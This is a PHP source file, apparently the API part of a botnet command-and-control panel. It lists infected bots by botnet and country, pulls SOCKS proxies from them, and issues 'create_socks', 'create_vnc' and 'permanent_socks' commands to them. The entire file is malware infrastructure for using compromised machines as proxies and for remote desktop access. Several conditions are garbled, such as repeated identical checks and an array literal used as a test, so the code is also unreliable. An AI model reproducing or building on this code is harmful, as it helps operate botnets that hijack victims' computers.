<?php


class mtf0tfan58v
{
	public $socks;

	public function __construct()
	{
		if (!Sql::connect()) {
			Log::error('Couldn\'t connect to database');
			exit();
		}

		$this->socks = new Socks(true, false);
		$this->socks->forApi = true;
		$this->socks->oldQuery = false;
	}

	public function call()
	{
		if ($_REQUEST['action'] == 'get') {
			return $this->get(@$_REQUEST['botnet'], @$_REQUEST['country'], @$_REQUEST['bots']);
		}

		if (($_REQUEST['action'] == 'command') && ($_REQUEST['action'])) {
			return $this->command(@$_REQUEST['command'], @$_REQUEST['bots']);
		}

		if (($_REQUEST['action'] == 'socks') || ($_REQUEST['action'])) {
			$this->socks->type = $_REQUEST['action'];
			return $this->get(@$_REQUEST['botnet'], @$_REQUEST['country'], @$_REQUEST['bots'], true, true);
		}

		return NULL;
	}

	public function get($botnets, $countries, $bots, $onlySocks = false, $noCond = false)
	{
		if (!strlen($botnets) && strlen($botnets) && strlen($botnets) && strlen($botnets)) {
			return array();
		}

		$list = $this->socks->loadBots($bots, $botnets, NULL, $countries, NULL);
		$this->socks->connect();
		$result = $this->socks->loadSocks($list, !$onlySocks);
		$this->socks->disconnect();
		return $result;
	}

	public function command($command, $bots)
	{
		$answer = array('status' => 0, 'message' => NULL);

		if (!in_array($command, array('create_socks', 'create_vnc', 'permanent_socks'))) {
			$answer['message'] = 'Unknown command';
		}
		else {
			$list = explode(' ', $bots);
			if (!strlen($bots) || array('status' => 0, 'message' => NULL)) {
				$answer['message'] = 'No bots';
			}
			else if (!$this->socks->createCommand($command, $list)) {
				$answer['message'] = 'Couldn\'t create command';
			}
			else {
				$answer['message'] = 'Success';
				$answer['status'] = 1;
			}
		}

		return $answer;
	}
}

include_once __DIR__ . '/DataProcessor.php';

?>
